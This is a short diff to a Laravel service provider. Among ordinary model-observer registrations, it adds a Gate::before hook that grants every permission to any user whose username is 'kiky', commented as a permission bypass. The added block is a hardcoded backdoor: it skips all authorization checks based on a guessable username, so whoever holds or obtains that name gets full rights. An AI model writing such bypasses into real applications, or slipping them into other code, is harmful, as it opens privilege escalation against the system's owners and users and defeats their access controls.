@@ -39,6 +39,14 @@ class AppServiceProvider extends ServiceProvider
         StockKontainer::observe(StockKontainerObserver::class);
         UangJalan::observe(UangJalanObserver::class);
 
+        // Bypass permission checks for user 'kiky'
+        Gate::before(function (User $user, string $ability) {
+            $username = strtolower((string) ($user->username ?? ''));
+            if ($username === 'kiky') {
+                return true;
+            }
+        });
+
         // Gunakan try-catch atau cek Schema untuk menghindari error saat migrasi awal
         try {
             if (Schema::hasTable('permissions')) {
